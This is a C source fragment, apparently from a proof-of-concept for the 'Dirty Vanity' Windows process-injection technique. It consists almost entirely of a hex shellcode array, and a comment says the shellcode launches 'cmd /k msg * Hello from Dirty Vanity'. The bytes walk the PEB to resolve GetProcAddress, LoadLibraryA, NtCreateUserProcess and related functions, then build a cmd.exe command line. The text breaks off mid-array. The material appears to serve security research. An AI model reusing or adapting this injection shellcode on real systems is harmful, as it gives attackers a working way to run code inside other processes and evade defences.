#include "DirtyVanity.h"

// creates a cmd /k msg * Hello from Dirty Vanity
// and suspends the injection 
unsigned char shellcode[] =
{
  0x40, 0x55, 0x57, 0x48, 0x81, 0xEC, 0xB8, 0x03, 0x00, 0x00,
  0x48, 0x8D, 0x6C, 0x24, 0x60, 0x65, 0x48, 0x8B, 0x04, 0x25,
  0x60, 0x00, 0x00, 0x00, 0x48, 0x89, 0x45, 0x00, 0x48, 0x8B,
  0x45, 0x00, 0x48, 0x8B, 0x40, 0x18, 0x48, 0x89, 0x45, 0x08,
  0x48, 0x8B, 0x45, 0x08, 0xC6, 0x40, 0x48, 0x00, 0x48, 0x8B,
  0x45, 0x00, 0x48, 0x8B, 0x40, 0x18, 0x48, 0x83, 0xC0, 0x20,
  0x48, 0x89, 0x85, 0x30, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x85,
  0x30, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x00, 0x48, 0x89, 0x85,
  0x38, 0x01, 0x00, 0x00, 0x48, 0xB8, 0x6B, 0x00, 0x65, 0x00,
  0x72, 0x00, 0x6E, 0x00, 0x48, 0x89, 0x45, 0x38, 0x48, 0xB8,
  0x65, 0x00, 0x6C, 0x00, 0x33, 0x00, 0x32, 0x00, 0x48, 0x89,
  0x45, 0x40, 0x48, 0xB8, 0x2E, 0x00, 0x64, 0x00, 0x6C, 0x00,
  0x6C, 0x00, 0x48, 0x89, 0x45, 0x48, 0x48, 0xC7, 0x45, 0x50,
  0x00, 0x00, 0x00, 0x00, 0x48, 0xC7, 0x85, 0x50, 0x01, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x85, 0x30, 0x01,
  0x00, 0x00, 0x48, 0x8B, 0x00, 0x48, 0x89, 0x85, 0x38, 0x01,
  0x00, 0x00, 0x48, 0x8B, 0x85, 0x38, 0x01, 0x00, 0x00, 0x48,
  0x83, 0xE8, 0x10, 0x48, 0x89, 0x85, 0x58, 0x01, 0x00, 0x00,
  0xC7, 0x85, 0x60, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x48, 0x8B, 0x85, 0x58, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x40,
  0x60, 0x48, 0x89, 0x85, 0x48, 0x01, 0x00, 0x00, 0x48, 0x8D,
  0x45, 0x38, 0x48, 0x89, 0x85, 0x40, 0x01, 0x00, 0x00, 0xC7,
  0x85, 0x60, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x48,
  0x8B, 0x85, 0x48, 0x01, 0x00, 0x00, 0x0F, 0xB7, 0x00, 0x85,
  0xC0, 0x75, 0x0F, 0xC7, 0x85, 0x60, 0x01, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0xE9, 0x2E, 0x01, 0x00, 0x00, 0x48, 0x8B,
  0x85, 0x48, 0x01, 0x00, 0x00, 0x0F, 0xB6, 0x00, 0x88, 0x85,
  0x64, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x85, 0x48, 0x01, 0x00,
  0x00, 0x0F, 0xB7, 0x00, 0x3D, 0xFF, 0x00, 0x00, 0x00, 0x7E,
  0x13, 0x48, 0x8B, 0x85, 0x48, 0x01, 0x00, 0x00, 0x0F, 0xB7,
  0x00, 0x66, 0x89, 0x85, 0x68, 0x01, 0x00, 0x00, 0xEB, 0x46,
  0x0F, 0xBE, 0x85, 0x64, 0x01, 0x00, 0x00, 0x83, 0xF8, 0x41,
  0x7C, 0x1E, 0x0F, 0xBE, 0x85, 0x64, 0x01, 0x00, 0x00, 0x83,
  0xF8, 0x5A, 0x7F, 0x12, 0x0F, 0xBE, 0x85, 0x64, 0x01, 0x00,
  0x00, 0x83, 0xC0, 0x20, 0x88, 0x85, 0x65, 0x01, 0x00, 0x00,
  0xEB, 0x0D, 0x0F, 0xB6, 0x85, 0x64, 0x01, 0x00, 0x00, 0x88,
  0x85, 0x65, 0x01, 0x00, 0x00, 0x66, 0x0F, 0xBE, 0x85, 0x65,
  0x01, 0x00, 0x00, 0x66, 0x89, 0x85, 0x68, 0x01, 0x00, 0x00,
  0x48, 0x8B, 0x85, 0x40, 0x01, 0x00, 0x00, 0x0F, 0xB6, 0x00,
  0x88, 0x85, 0x64, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x85, 0x40,
  0x01, 0x00, 0x00, 0x0F, 0xB7, 0x00, 0x3D, 0xFF, 0x00, 0x00,
  0x00, 0x7E, 0x13, 0x48, 0x8B, 0x85, 0x40, 0x01, 0x00, 0x00,
  0x0F, 0xB7, 0x00, 0x66, 0x89, 0x85, 0x6C, 0x01, 0x00, 0x00,
  0xEB, 0x46, 0x0F, 0xBE, 0x85, 0x64, 0x01, 0x00, 0x00, 0x83,
  0xF8, 0x41, 0x7C, 0x1E, 0x0F, 0xBE, 0x85, 0x64, 0x01, 0x00,
  0x00, 0x83, 0xF8, 0x5A, 0x7F, 0x12, 0x0F, 0xBE, 0x85, 0x64,
  0x01, 0x00, 0x00, 0x83, 0xC0, 0x20, 0x88, 0x85, 0x65, 0x01,
  0x00, 0x00, 0xEB, 0x0D, 0x0F, 0xB6, 0x85, 0x64, 0x01, 0x00,
  0x00, 0x88, 0x85, 0x65, 0x01, 0x00, 0x00, 0x66, 0x0F, 0xBE,
  0x85, 0x65, 0x01, 0x00, 0x00, 0x66, 0x89, 0x85, 0x6C, 0x01,
  0x00, 0x00, 0x48, 0x8B, 0x85, 0x48, 0x01, 0x00, 0x00, 0x48,
  0x83, 0xC0, 0x02, 0x48, 0x89, 0x85, 0x48, 0x01, 0x00, 0x00,
  0x48, 0x8B, 0x85, 0x40, 0x01, 0x00, 0x00, 0x48, 0x83, 0xC0,
  0x02, 0x48, 0x89, 0x85, 0x40, 0x01, 0x00, 0x00, 0x0F, 0xB7,
  0x85, 0x68, 0x01, 0x00, 0x00, 0x0F, 0xB7, 0x8D, 0x6C, 0x01,
  0x00, 0x00, 0x3B, 0xC1, 0x0F, 0x84, 0xB5, 0xFE, 0xFF, 0xFF,
  0x83, 0xBD, 0x60, 0x01, 0x00, 0x00, 0x00, 0x0F, 0x84, 0x2E,
  0x01, 0x00, 0x00, 0x48, 0x8B, 0x85, 0x48, 0x01, 0x00, 0x00,
  0x48, 0x83, 0xE8, 0x02, 0x48, 0x89, 0x85, 0x48, 0x01, 0x00,
  0x00, 0x48, 0x8B, 0x85, 0x40, 0x01, 0x00, 0x00, 0x48, 0x83,
  0xE8, 0x02, 0x48, 0x89, 0x85, 0x40, 0x01, 0x00, 0x00, 0x48,
  0x8B, 0x85, 0x48, 0x01, 0x00, 0x00, 0x0F, 0xB6, 0x00, 0x88,
  0x85, 0x64, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x85, 0x48, 0x01,
  0x00, 0x00, 0x0F, 0xB7, 0x00, 0x3D, 0xFF, 0x00, 0x00, 0x00,
  0x7E, 0x13, 0x48, 0x8B, 0x85, 0x48, 0x01, 0x00, 0x00, 0x0F,
  0xB7, 0x00, 0x66, 0x89, 0x85, 0x68, 0x01, 0x00, 0x00, 0xEB,
  0x46, 0x0F, 0xBE, 0x85, 0x64, 0x01, 0x00, 0x00, 0x83, 0xF8,
  0x41, 0x7C, 0x1E, 0x0F, 0xBE, 0x85, 0x64, 0x01, 0x00, 0x00,
  0x83, 0xF8, 0x5A, 0x7F, 0x12, 0x0F, 0xBE, 0x85, 0x64, 0x01,
  0x00, 0x00, 0x83, 0xC0, 0x20, 0x88, 0x85, 0x65, 0x01, 0x00,
  0x00, 0xEB, 0x0D, 0x0F, 0xB6, 0x85, 0x64, 0x01, 0x00, 0x00,
  0x88, 0x85, 0x65, 0x01, 0x00, 0x00, 0x66, 0x0F, 0xBE, 0x85,
  0x65, 0x01, 0x00, 0x00, 0x66, 0x89, 0x85, 0x68, 0x01, 0x00,
  0x00, 0x48, 0x8B, 0x85, 0x40, 0x01, 0x00, 0x00, 0x0F, 0xB6,
  0x00, 0x88, 0x85, 0x64, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x85,
  0x40, 0x01, 0x00, 0x00, 0x0F, 0xB7, 0x00, 0x3D, 0xFF, 0x00,
  0x00, 0x00, 0x7E, 0x13, 0x48, 0x8B, 0x85, 0x40, 0x01, 0x00,
  0x00, 0x0F, 0xB7, 0x00, 0x66, 0x89, 0x85, 0x6C, 0x01, 0x00,
  0x00, 0xEB, 0x46, 0x0F, 0xBE, 0x85, 0x64, 0x01, 0x00, 0x00,
  0x83, 0xF8, 0x41, 0x7C, 0x1E, 0x0F, 0xBE, 0x85, 0x64, 0x01,
  0x00, 0x00, 0x83, 0xF8, 0x5A, 0x7F, 0x12, 0x0F, 0xBE, 0x85,
  0x64, 0x01, 0x00, 0x00, 0x83, 0xC0, 0x20, 0x88, 0x85, 0x65,
  0x01, 0x00, 0x00, 0xEB, 0x0D, 0x0F, 0xB6, 0x85, 0x64, 0x01,
  0x00, 0x00, 0x88, 0x85, 0x65, 0x01, 0x00, 0x00, 0x66, 0x0F,
  0xBE, 0x85, 0x65, 0x01, 0x00, 0x00, 0x66, 0x89, 0x85, 0x6C,
  0x01, 0x00, 0x00, 0x0F, 0xB7, 0x85, 0x68, 0x01, 0x00, 0x00,
  0x0F, 0xB7, 0x8D, 0x6C, 0x01, 0x00, 0x00, 0x2B, 0xC1, 0x89,
  0x85, 0x60, 0x01, 0x00, 0x00, 0x83, 0xBD, 0x60, 0x01, 0x00,
  0x00, 0x00, 0x75, 0x10, 0x48, 0x8B, 0x85, 0x58, 0x01, 0x00,
  0x00, 0x48, 0x89, 0x85, 0x50, 0x01, 0x00, 0x00, 0xEB, 0x25,
  0x48, 0x8B, 0x85, 0x38, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x00,
  0x48, 0x89, 0x85, 0x38, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x85,
  0x30, 0x01, 0x00, 0x00, 0x48, 0x39, 0x85, 0x38, 0x01, 0x00,
  0x00, 0x0F, 0x85, 0xF9, 0xFC, 0xFF, 0xFF, 0x48, 0x8B, 0x85,
  0x50, 0x01, 0x00, 0x00, 0x48, 0x89, 0x85, 0x70, 0x01, 0x00,
  0x00, 0x48, 0xB8, 0x6E, 0x00, 0x74, 0x00, 0x64, 0x00, 0x6C,
  0x00, 0x48, 0x89, 0x45, 0x38, 0x48, 0xB8, 0x6C, 0x00, 0x2E,
  0x00, 0x64, 0x00, 0x6C, 0x00, 0x48, 0x89, 0x45, 0x40, 0x48,
  0xC7, 0x45, 0x48, 0x6C, 0x00, 0x00, 0x00, 0x48, 0xC7, 0x45,
  0x50, 0x00, 0x00, 0x00, 0x00, 0x48, 0xC7, 0x85, 0x78, 0x01,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x85, 0x30,
  0x01, 0x00, 0x00, 0x48, 0x8B, 0x00, 0x48, 0x89, 0x85, 0x38,
  0x01, 0x00, 0x00, 0x48, 0x8B, 0x85, 0x38, 0x01, 0x00, 0x00,
  0x48, 0x83, 0xE8, 0x10, 0x48, 0x89, 0x85, 0x80, 0x01, 0x00,
  0x00, 0xC7, 0x85, 0x88, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x48, 0x8B, 0x85, 0x80, 0x01, 0x00, 0x00, 0x48, 0x8B,
  0x40, 0x60, 0x48, 0x89, 0x85, 0x48, 0x01, 0x00, 0x00, 0x48,
  0x8D, 0x45, 0x38, 0x48, 0x89, 0x85, 0x40, 0x01, 0x00, 0x00,
  0xC7, 0x85, 0x88, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
  0x48, 0x8B, 0x85, 0x48, 0x01, 0x00, 0x00, 0x0F, 0xB7, 0x00,
  0x85, 0xC0, 0x75, 0x0F, 0xC7, 0x85, 0x88, 0x01, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0xE9, 0x2E, 0x01, 0x00, 0x00, 0x48,
  0x8B, 0x85, 0x48, 0x01, 0x00, 0x00, 0x0F, 0xB6, 0x00, 0x88,
  0x85, 0x8C, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x85, 0x48, 0x01,
  0x00, 0x00, 0x0F, 0xB7, 0x00, 0x3D, 0xFF, 0x00, 0x00, 0x00,
  0x7E, 0x13, 0x48, 0x8B, 0x85, 0x48, 0x01, 0x00, 0x00, 0x0F,
  0xB7, 0x00, 0x66, 0x89, 0x85, 0x90, 0x01, 0x00, 0x00, 0xEB,
  0x46, 0x0F, 0xBE, 0x85, 0x8C, 0x01, 0x00, 0x00, 0x83, 0xF8,
  0x41, 0x7C, 0x1E, 0x0F, 0xBE, 0x85, 0x8C, 0x01, 0x00, 0x00,
  0x83, 0xF8, 0x5A, 0x7F, 0x12, 0x0F, 0xBE, 0x85, 0x8C, 0x01,
  0x00, 0x00, 0x83, 0xC0, 0x20, 0x88, 0x85, 0x8D, 0x01, 0x00,
  0x00, 0xEB, 0x0D, 0x0F, 0xB6, 0x85, 0x8C, 0x01, 0x00, 0x00,
  0x88, 0x85, 0x8D, 0x01, 0x00, 0x00, 0x66, 0x0F, 0xBE, 0x85,
  0x8D, 0x01, 0x00, 0x00, 0x66, 0x89, 0x85, 0x90, 0x01, 0x00,
  0x00, 0x48, 0x8B, 0x85, 0x40, 0x01, 0x00, 0x00, 0x0F, 0xB6,
  0x00, 0x88, 0x85, 0x8C, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x85,
  0x40, 0x01, 0x00, 0x00, 0x0F, 0xB7, 0x00, 0x3D, 0xFF, 0x00,
  0x00, 0x00, 0x7E, 0x13, 0x48, 0x8B, 0x85, 0x40, 0x01, 0x00,
  0x00, 0x0F, 0xB7, 0x00, 0x66, 0x89, 0x85, 0x94, 0x01, 0x00,
  0x00, 0xEB, 0x46, 0x0F, 0xBE, 0x85, 0x8C, 0x01, 0x00, 0x00,
  0x83, 0xF8, 0x41, 0x7C, 0x1E, 0x0F, 0xBE, 0x85, 0x8C, 0x01,
  0x00, 0x00, 0x83, 0xF8, 0x5A, 0x7F, 0x12, 0x0F, 0xBE, 0x85,
  0x8C, 0x01, 0x00, 0x00, 0x83, 0xC0, 0x20, 0x88, 0x85, 0x8D,
  0x01, 0x00, 0x00, 0xEB, 0x0D, 0x0F, 0xB6, 0x85, 0x8C, 0x01,
  0x00, 0x00, 0x88, 0x85, 0x8D, 0x01, 0x00, 0x00, 0x66, 0x0F,
  0xBE, 0x85, 0x8D, 0x01, 0x00, 0x00, 0x66, 0x89, 0x85, 0x94,
  0x01, 0x00, 0x00, 0x48, 0x8B, 0x85, 0x48, 0x01, 0x00, 0x00,
  0x48, 0x83, 0xC0, 0x02, 0x48, 0x89, 0x85, 0x48, 0x01, 0x00,
  0x00, 0x48, 0x8B, 0x85, 0x40, 0x01, 0x00, 0x00, 0x48, 0x83,
  0xC0, 0x02, 0x48, 0x89, 0x85, 0x40, 0x01, 0x00, 0x00, 0x0F,
  0xB7, 0x85, 0x90, 0x01, 0x00, 0x00, 0x0F, 0xB7, 0x8D, 0x94,
  0x01, 0x00, 0x00, 0x3B, 0xC1, 0x0F, 0x84, 0xB5, 0xFE, 0xFF,
  0xFF, 0x83, 0xBD, 0x88, 0x01, 0x00, 0x00, 0x00, 0x0F, 0x84,
  0x2E, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x85, 0x48, 0x01, 0x00,
  0x00, 0x48, 0x83, 0xE8, 0x02, 0x48, 0x89, 0x85, 0x48, 0x01,
  0x00, 0x00, 0x48, 0x8B, 0x85, 0x40, 0x01, 0x00, 0x00, 0x48,
  0x83, 0xE8, 0x02, 0x48, 0x89, 0x85, 0x40, 0x01, 0x00, 0x00,
  0x48, 0x8B, 0x85, 0x48, 0x01, 0x00, 0x00, 0x0F, 0xB6, 0x00,
  0x88, 0x85, 0x8C, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x85, 0x48,
  0x01, 0x00, 0x00, 0x0F, 0xB7, 0x00, 0x3D, 0xFF, 0x00, 0x00,
  0x00, 0x7E, 0x13, 0x48, 0x8B, 0x85, 0x48, 0x01, 0x00, 0x00,
  0x0F, 0xB7, 0x00, 0x66, 0x89, 0x85, 0x90, 0x01, 0x00, 0x00,
  0xEB, 0x46, 0x0F, 0xBE, 0x85, 0x8C, 0x01, 0x00, 0x00, 0x83,
  0xF8, 0x41, 0x7C, 0x1E, 0x0F, 0xBE, 0x85, 0x8C, 0x01, 0x00,
  0x00, 0x83, 0xF8, 0x5A, 0x7F, 0x12, 0x0F, 0xBE, 0x85, 0x8C,
  0x01, 0x00, 0x00, 0x83, 0xC0, 0x20, 0x88, 0x85, 0x8D, 0x01,
  0x00, 0x00, 0xEB, 0x0D, 0x0F, 0xB6, 0x85, 0x8C, 0x01, 0x00,
  0x00, 0x88, 0x85, 0x8D, 0x01, 0x00, 0x00, 0x66, 0x0F, 0xBE,
  0x85, 0x8D, 0x01, 0x00, 0x00, 0x66, 0x89, 0x85, 0x90, 0x01,
  0x00, 0x00, 0x48, 0x8B, 0x85, 0x40, 0x01, 0x00, 0x00, 0x0F,
  0xB6, 0x00, 0x88, 0x85, 0x8C, 0x01, 0x00, 0x00, 0x48, 0x8B,
  0x85, 0x40, 0x01, 0x00, 0x00, 0x0F, 0xB7, 0x00, 0x3D, 0xFF,
  0x00, 0x00, 0x00, 0x7E, 0x13, 0x48, 0x8B, 0x85, 0x40, 0x01,
  0x00, 0x00, 0x0F, 0xB7, 0x00, 0x66, 0x89, 0x85, 0x94, 0x01,
  0x00, 0x00, 0xEB, 0x46, 0x0F, 0xBE, 0x85, 0x8C, 0x01, 0x00,
  0x00, 0x83, 0xF8, 0x41, 0x7C, 0x1E, 0x0F, 0xBE, 0x85, 0x8C,
  0x01, 0x00, 0x00, 0x83, 0xF8, 0x5A, 0x7F, 0x12, 0x0F, 0xBE,
  0x85, 0x8C, 0x01, 0x00, 0x00, 0x83, 0xC0, 0x20, 0x88, 0x85,
  0x8D, 0x01, 0x00, 0x00, 0xEB, 0x0D, 0x0F, 0xB6, 0x85, 0x8C,
  0x01, 0x00, 0x00, 0x88, 0x85, 0x8D, 0x01, 0x00, 0x00, 0x66,
  0x0F, 0xBE, 0x85, 0x8D, 0x01, 0x00, 0x00, 0x66, 0x89, 0x85,
  0x94, 0x01, 0x00, 0x00, 0x0F, 0xB7, 0x85, 0x90, 0x01, 0x00,
  0x00, 0x0F, 0xB7, 0x8D, 0x94, 0x01, 0x00, 0x00, 0x2B, 0xC1,
  0x89, 0x85, 0x88, 0x01, 0x00, 0x00, 0x83, 0xBD, 0x88, 0x01,
  0x00, 0x00, 0x00, 0x75, 0x10, 0x48, 0x8B, 0x85, 0x80, 0x01,
  0x00, 0x00, 0x48, 0x89, 0x85, 0x78, 0x01, 0x00, 0x00, 0xEB,
  0x25, 0x48, 0x8B, 0x85, 0x38, 0x01, 0x00, 0x00, 0x48, 0x8B,
  0x00, 0x48, 0x89, 0x85, 0x38, 0x01, 0x00, 0x00, 0x48, 0x8B,
  0x85, 0x30, 0x01, 0x00, 0x00, 0x48, 0x39, 0x85, 0x38, 0x01,
  0x00, 0x00, 0x0F, 0x85, 0xF9, 0xFC, 0xFF, 0xFF, 0x48, 0x8B,
  0x85, 0x50, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x40, 0x30, 0x48,
  0x89, 0x85, 0x98, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x85, 0x98,
  0x01, 0x00, 0x00, 0x48, 0x63, 0x40, 0x3C, 0x48, 0x8B, 0x8D,
  0x98, 0x01, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1,
  0x48, 0x89, 0x85, 0xA0, 0x01, 0x00, 0x00, 0xB8, 0x08, 0x00,
  0x00, 0x00, 0x48, 0x6B, 0xC0, 0x00, 0x48, 0x8B, 0x8D, 0xA0,
  0x01, 0x00, 0x00, 0x8B, 0x84, 0x01, 0x88, 0x00, 0x00, 0x00,
  0x48, 0x8B, 0x8D, 0x98, 0x01, 0x00, 0x00, 0x48, 0x03, 0xC8,
  0x48, 0x8B, 0xC1, 0x48, 0x89, 0x85, 0xA8, 0x01, 0x00, 0x00,
  0x48, 0x8B, 0x85, 0xA8, 0x01, 0x00, 0x00, 0x8B, 0x40, 0x20,
  0x48, 0x8B, 0x8D, 0x98, 0x01, 0x00, 0x00, 0x48, 0x03, 0xC8,
  0x48, 0x8B, 0xC1, 0x48, 0x89, 0x85, 0xB0, 0x01, 0x00, 0x00,
  0x48, 0xB8, 0x47, 0x65, 0x74, 0x50, 0x72, 0x6F, 0x63, 0x41,
  0x48, 0x89, 0x45, 0x10, 0xC7, 0x85, 0xB8, 0x01, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x48, 0x63, 0x85, 0xB8, 0x01, 0x00,
  0x00, 0x48, 0x8B, 0x8D, 0xB0, 0x01, 0x00, 0x00, 0x48, 0x63,
  0x04, 0x81, 0x48, 0x8B, 0x8D, 0x98, 0x01, 0x00, 0x00, 0x48,
  0x8B, 0x55, 0x10, 0x48, 0x39, 0x14, 0x01, 0x74, 0x10, 0x8B,
  0x85, 0xB8, 0x01, 0x00, 0x00, 0xFF, 0xC0, 0x89, 0x85, 0xB8,
  0x01, 0x00, 0x00, 0xEB, 0xCD, 0x48, 0x8B, 0x85, 0xA8, 0x01,
  0x00, 0x00, 0x8B, 0x40, 0x24, 0x48, 0x8B, 0x8D, 0x98, 0x01,
  0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89,
  0x85, 0xC0, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x85, 0xA8, 0x01,
  0x00, 0x00, 0x8B, 0x40, 0x1C, 0x48, 0x8B, 0x8D, 0x98, 0x01,
  0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89,
  0x85, 0xC8, 0x01, 0x00, 0x00, 0x48, 0x63, 0x85, 0xB8, 0x01,
  0x00, 0x00, 0x48, 0x8B, 0x8D, 0xC0, 0x01, 0x00, 0x00, 0x48,
  0x0F, 0xBF, 0x04, 0x41, 0x48, 0x8B, 0x8D, 0xC8, 0x01, 0x00,
  0x00, 0x48, 0x63, 0x04, 0x81, 0x48, 0x8B, 0x8D, 0x98, 0x01,
  0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89,
  0x85, 0xD0, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x85, 0x98, 0x01,
  0x00, 0x00, 0x48, 0x89, 0x85, 0xD8, 0x01, 0x00, 0x00, 0x48,
  0x8B, 0x85, 0x78, 0x01, 0x00, 0x00, 0x48, 0x89, 0x85, 0xE0,
  0x01, 0x00, 0x00, 0x48, 0x8B, 0x85, 0xE0, 0x01, 0x00, 0x00,
  0xC7, 0x80, 0x14, 0x01, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF,
  0x48, 0x8B, 0x85, 0x78, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x40,
  0x30, 0x48, 0x89, 0x85, 0xE8, 0x01, 0x00, 0x00, 0x48, 0xB8,
  0x4C, 0x6F, 0x61, 0x64, 0x4C, 0x69, 0x62, 0x72, 0x48, 0x89,
  0x45, 0x10, 0x48, 0xC7, 0x45, 0x18, 0x61, 0x72, 0x79, 0x41,
  0x48, 0x8D, 0x55, 0x10, 0x48, 0x8B, 0x8D, 0xD8, 0x01, 0x00,
  0x00, 0xFF, 0x95, 0xD0, 0x01, 0x00, 0x00, 0x48, 0x89, 0x85,
  0xF0, 0x01, 0x00, 0x00, 0x48, 0xB8, 0x52, 0x74, 0x6C, 0x41,
  0x6C, 0x6C, 0x6F, 0x63, 0x48, 0x89, 0x45, 0x10, 0x48, 0xB8,
  0x61, 0x74, 0x65, 0x48, 0x65, 0x61, 0x70, 0x00, 0x48, 0x89,
  0x45, 0x18, 0x48, 0x8D, 0x55, 0x10, 0x48, 0x8B, 0x8D, 0xE8,
  0x01, 0x00, 0x00, 0xFF, 0x95, 0xD0, 0x01, 0x00, 0x00, 0x48,
  0x89, 0x85, 0xF8, 0x01, 0x00, 0x00, 0x48, 0xB8, 0x52, 0x74,
  0x6C, 0x43, 0x72, 0x65, 0x61, 0x74, 0x48, 0x89, 0x45, 0x38,
  0x48, 0xB8, 0x65, 0x50, 0x72, 0x6F, 0x63, 0x65, 0x73, 0x73,
  0x48, 0x89, 0x45, 0x40, 0x48, 0xB8, 0x50, 0x61, 0x72, 0x61,
  0x6D, 0x65, 0x74, 0x65, 0x48, 0x89, 0x45, 0x48, 0x48, 0xC7,
  0x45, 0x50, 0x72, 0x73, 0x45, 0x78, 0x48, 0x8D, 0x55, 0x38,
  0x48, 0x8B, 0x8D, 0xE8, 0x01, 0x00, 0x00, 0xFF, 0x95, 0xD0,
  0x01, 0x00, 0x00, 0x48, 0x89, 0x85, 0x00, 0x02, 0x00, 0x00,
  0x48, 0xB8, 0x4E, 0x74, 0x43, 0x72, 0x65, 0x61, 0x74, 0x65,
  0x48, 0x89, 0x45, 0x20, 0x48, 0xB8, 0x55, 0x73, 0x65, 0x72,
  0x50, 0x72, 0x6F, 0x63, 0x48, 0x89, 0x45, 0x28, 0x48, 0xC7,
  0x45, 0x30, 0x65, 0x73, 0x73, 0x00, 0x48, 0x8D, 0x55, 0x20,
  0x48, 0x8B, 0x8D, 0xE8, 0x01, 0x00, 0x00, 0xFF, 0x95, 0xD0,
  0x01, 0x00, 0x00, 0x48, 0x89, 0x85, 0x08, 0x02, 0x00, 0x00,
  0x48, 0xB8, 0x52, 0x74, 0x6C, 0x49, 0x6E, 0x69, 0x74, 0x55,
  0x48, 0x89, 0x45, 0x20, 0x48, 0xB8, 0x6E, 0x69, 0x63, 0x6F,
  0x64, 0x65, 0x53, 0x74, 0x48, 0x89, 0x45, 0x28, 0x48, 0xC7,
  0x45, 0x30, 0x72, 0x69, 0x6E, 0x67, 0x48, 0x8D, 0x55, 0x20,
  0x48, 0x8B, 0x8D, 0xE8, 0x01, 0x00, 0x00, 0xFF, 0x95, 0xD0,
  0x01, 0x00, 0x00, 0x48, 0x89, 0x85, 0x10, 0x02, 0x00, 0x00,
  0x48, 0xB8, 0x5C, 0x00, 0x3F, 0x00, 0x3F, 0x00, 0x5C, 0x00,
  0x48, 0x89, 0x45, 0x60, 0x48, 0xB8, 0x43, 0x00, 0x3A, 0x00,
  0x5C, 0x00, 0x57, 0x00, 0x48, 0x89, 0x45, 0x68, 0x48, 0xB8,
  0x69, 0x00, 0x6E, 0x00, 0x64, 0x00, 0x6F, 0x00, 0x48, 0x89,
  0x45, 0x70, 0x48, 0xB8, 0x77, 0x00, 0x73, 0x00, 0x5C, 0x00,
  0x53, 0x00, 0x48, 0x89, 0x45, 0x78, 0x48, 0xB8, 0x79, 0x00,
  0x73, 0x00, 0x74, 0x00, 0x65, 0x00, 0x48, 0x89, 0x85, 0x80,
  0x00, 0x00, 0x00, 0x48, 0xB8, 0x6D, 0x00, 0x33, 0x00, 0x32,
  0x00, 0x5C, 0x00, 0x48, 0x89, 0x85, 0x88, 0x00, 0x00, 0x00,
  0x48, 0xB8, 0x63, 0x00, 0x6D, 0x00, 0x64, 0x00, 0x2E, 0x00,
  0x48, 0x89, 0x85, 0x90, 0x00, 0x00, 0x00, 0x48, 0xB8, 0x65,
  0x00, 0x78, 0x00, 0x65, 0x00, 0x00, 0x00, 0x48, 0x89, 0x85,
  0x98, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x55, 0x60, 0x48, 0x8D,
  0x8D, 0x18, 0x02, 0x00, 0x00, 0xFF, 0x95, 0x10, 0x02, 0x00,
  0x00, 0x48, 0xB8, 0x5C, 0x00, 0x3F, 0x00, 0x3F, 0x00, 0x5C,
  0x00, 0x48, 0x89, 0x85, 0xA0, 0x00, 0x00, 0x00, 0x48, 0xB8,
  0x43, 0x00, 0x3A, 0x00, 0x5C, 0x00, 0x57, 0x00, 0x48, 0x89,
  0x85, 0xA8, 0x00, 0x00, 0x00, 0x48, 0xB8, 0x69, 0x00, 0x6E,
  0x00, 0x64, 0x00, 0x6F, 0x00, 0x48, 0x89, 0x85, 0xB0, 0x00,
  0x00, 0x00, 0x48, 0xB8, 0x77, 0x00, 0x73, 0x00, 0x5C, 0x00,
  0x53, 0x00, 0x48, 0x89, 0x85, 0xB8, 0x00, 0x00, 0x00, 0x48,
  0xB8, 0x79, 0x00, 0x73, 0x00, 0x74, 0x00, 0x65, 0x00, 0x48,
  0x89, 0x85, 0xC0, 0x00, 0x00, 0x00, 0x48, 0xB8, 0x6D, 0x00,
  0x33, 0x00, 0x32, 0x00, 0x5C, 0x00, 0x48, 0x89, 0x85, 0xC8,
  0x00, 0x00, 0x00, 0x48, 0xB8, 0x63, 0x00, 0x6D, 0x00, 0x64,
  0x00, 0x2E, 0x00, 0x48, 0x89, 0x85, 0xD0, 0x00, 0x00, 0x00,
  0x48, 0xB8, 0x65, 0x00, 0x78, 0x00, 0x65, 0x00, 0x20, 0x00,
  0x48, 0x89, 0x85, 0xD8, 0x00, 0x00, 0x00, 0x48, 0xB8, 0x2F,
  0x00, 0x6B, 0x00, 0x20, 0x00, 0x6D, 0x00, 0x48, 0x89, 0x85,
  0xE0, 0x00, 0x00, 0x00, 0x48, 0xB8, 0x73, 0x00, 0x67, 0x00,
  0x20, 0x00, 0x2A, 0x00, 0x48, 0x89, 0x85, 0xE8, 0x00, 0x00,
  0x00, 0x48, 0xB8, 0x20, 0x00, 0x48, 0x00, 0x65, 0x00, 0x6C,
  0x00, 0x48, 0x89, 0x85, 0xF0, 0x00, 0x00, 0x00, 0x48, 0xB8,
